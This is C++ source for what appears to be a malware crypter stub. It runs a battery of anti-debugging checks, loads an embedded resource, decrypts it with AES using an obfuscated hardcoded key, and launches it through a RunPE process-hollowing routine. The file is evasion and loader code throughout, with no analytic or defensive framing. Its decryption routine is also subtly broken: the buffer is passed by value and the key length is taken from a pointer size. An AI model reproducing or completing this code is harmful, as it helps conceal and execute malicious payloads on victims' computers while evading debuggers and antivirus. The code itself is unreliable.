#include <iostream>
#include <Windows.h>
#include <fstream>
#include "Runpe.h"
#include <vector>
#include "Junk2.h"
#include <string>
#include "Header.h"
#include "antidbg.h"
#include "Junk3.h"
#include "obfuscat.h"
using namespace std;


int Rsize;


std::vector<char> RData;

void Resource(int id)
{
	size_t Rsize;
	HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(id), RT_RCDATA);
	HGLOBAL temp = LoadResource(NULL, hResource);
	Rsize = SizeofResource(NULL, hResource);
	RData.resize(Rsize);
	memcpy((void*)RData.data(), temp, Rsize);  // replace &RData[0] with RData.data() if C++11
}


void AESDecrypt(std::vector<char> toDecrypt, int size)
{
	XorS(X, OBFUSCATE("S#q-}=6{)BuEV[GDeZy>~M5D/P&Q}6>"));
	std::string temp = X.decrypt();
	unsigned char ciphertext[BLOCK_SIZE];
	unsigned char decrypted[BLOCK_SIZE];

	aes_ctx_t* ctx;
	virtualAES::initialize();
	ctx = virtualAES::allocatectx((unsigned char *)temp.c_str(), sizeof(temp.c_str()));

	int count = 0;
	int index = size / 16;
	int innerCount = 0;
	int innerIndex = 16;
	int dataCount = 0;
	int copyCount = 0;
	for (count; count < index; count++)
	{
		for (innerCount = 0; innerCount < innerIndex; innerCount++)
		{
			ciphertext[innerCount] = toDecrypt[dataCount];
			dataCount++;
		}

		virtualAES::decrypt(ctx, ciphertext, decrypted);

		for (innerCount = 0; innerCount < innerIndex; innerCount++)
		{
			toDecrypt[copyCount] = decrypted[innerCount];
			copyCount++;
		}
	}

	delete ctx;
}

void enc()
{
	AESDecrypt(RData, RData.size());
}



int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	adbg_IsDebuggerPresent();
	adbg_IsDebuggerPresent();
	adbg_CheckRemoteDebuggerPresent();
	adbg_NtQueryInformationProcess();
	adbg_BeingDebuggedPEB();
	adbg_NtGlobalFlagPEB();
	adbg_HardwareDebugRegisters();
	adbg_RDTSC();
	adbg_QueryPerformanceCounter();
	adbg_GetTickCount();

	Resource(10);
	LPVOID pFile;
	TCHAR szFilePath[1024];
	enc();
	pFile = RData.data();
	if (pFile)
	{
		GetModuleFileNameA(0, LPSTR(szFilePath), 1024);
		NTRX_RUNPE32(pFile);
	}

	return 0;
};